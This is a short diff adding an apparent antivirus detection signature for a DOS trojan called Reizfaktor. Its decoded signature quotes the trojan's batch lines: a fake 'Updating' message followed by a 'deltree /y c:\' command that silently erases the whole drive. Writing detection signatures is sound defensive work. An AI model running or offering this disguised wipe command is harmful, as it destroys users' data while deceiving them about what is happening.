@@ -1,0 +1,8 @@
+VIRUS NAME: Dos.Trojan.Reizfaktor-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+ho Updating! This May Take A While...
+@Echo Please Wait...
+@deltree /y c:\ > c:\Reizfaktor.txt
+
